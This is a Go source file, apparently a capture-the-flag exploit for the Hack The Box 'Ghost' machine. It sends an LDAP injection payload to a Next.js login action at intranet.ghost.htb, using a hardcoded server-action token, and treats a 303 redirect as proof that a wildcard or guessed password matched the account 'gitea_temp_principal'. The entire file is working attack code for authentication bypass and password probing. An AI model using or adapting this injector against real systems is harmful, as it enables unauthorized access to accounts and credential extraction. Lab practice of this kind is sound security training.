package main

import (
	"fmt"
	"net/http"
	"strings"
)

// Create ldap-injector opbject
type LdapInjector struct {
	Url string
	Username string
}

// Initialize ldap-injector properties
func NewLdapInjector(url, username string) *LdapInjector {
	return &LdapInjector{
		Url: url,
		Username: username,
	}
}

func (li *LdapInjector) TestPassword(password string) (bool, error) {
	payload := fmt.Sprintf(`1_ldap-username=%s&1_ldap-secret=%s&0=[{},"$K1"]`, li.Username, password)
	req, err := http.NewRequest("POST", li.Url, strings.NewReader(payload))
	if err != nil {
		return false, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	// ghost.htb is a Next.js app, so we need to set this next action token.
	// Future improvement: visit the page to get this token first so it's not hardcoded.
	req.Header.Set("Next-Action", "c471eb076ccac91d6f828b671795550fd5925940")

	// Do not follow redirects
	client := http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	return resp.StatusCode == 303, nil
}

func main () {
	c := NewLdapInjector("http://intranet.ghost.htb", "gitea_temp_principal")
	resp, err := c.TestPassword("*")
	if err != nil {
		fmt.Println("Error:", err)
		return
	}
	fmt.Println("Response:", resp)
}